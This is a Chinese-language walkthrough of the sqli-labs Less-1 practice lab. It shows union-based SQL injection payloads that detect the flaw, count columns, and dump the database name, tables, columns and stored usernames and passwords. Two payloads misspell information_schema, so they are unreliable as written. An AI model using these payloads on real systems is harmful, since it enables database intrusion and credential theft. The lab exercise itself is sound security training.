使用单引号判断存在sql注入

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/F8AEE938496E4D2CBB79E8EB418AAAAEclipboard.png)



# 1.使用union select 或 order by 猜列数

## 1.1 order by

http://127.0.0.1/sql-labs/Less-1/?id=1'order by 3 --+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/CFAEB88FE2F042C8BD1EF01D7AE8198Dclipboard.png)



http://127.0.0.1/sql-labs/Less-1/?id=1'order by 4 --+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/CA7969D0144E4364940BA5F275395ABBclipboard.png)

此处有个小技巧，使用二分查找发会更快。



## 1.2 union select 

http://127.0.0.1/sql-labs/Less-1/?id=1'union select 1,2,3--+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/510BAAF0539E49B18C20FDFF0CFD05FEclipboard.png)



http://127.0.0.1/sql-labs/Less-1/?id=1%27union%20select%201,2,3,4--+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/40977345B7BC478693E3BF9F24246E73clipboard.png)

通过两个连接返回的页面不同，判断该数据表有三列。



# 2. 确定回显列

由于表中每列的数据类型不一定相同，所以需要确定查询的数据回显在那一列。

这里猜测数据表的第一列id为int型，name列和password列为字符型。

我们查询的数据为字符型，所以确定二三列为回显列。

如：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/EFC959EE69C043CE82CBF4C1BE83A4FEclipboard.png)

这里有一个点需要注意，我们需要使union之前的第一个查询报错，才能将我们需要查询的数据显示到原查询所在的位置。



# 3.执行语句报数据库信息。

3.1爆库

http://127.0.0.1/sql-labs/Less-1/?id=-1'union select 1,database(),3--+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/E3773254C390420584DBBC50EE11DB8Fclipboard.png)



3.2爆表

union select 1,group_concat(table_name),3 from infotaion_schema.tables where table_schema='security'--+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/32DB0BF6100B434EBFA51C96AE1369F4clipboard.png)



3.3爆字段

union select 1,group_concat(column_name),3 from infomation_schema.columns where table_name='user'

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/EEFFBDCF5539462EBE7250E2A6EA914Aclipboard.png)



3.4爆字段内容

union select 1,username,password from users where id=3 --+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/3B46EA66DA3A478AA069CBB21D82CCF6clipboard.png)

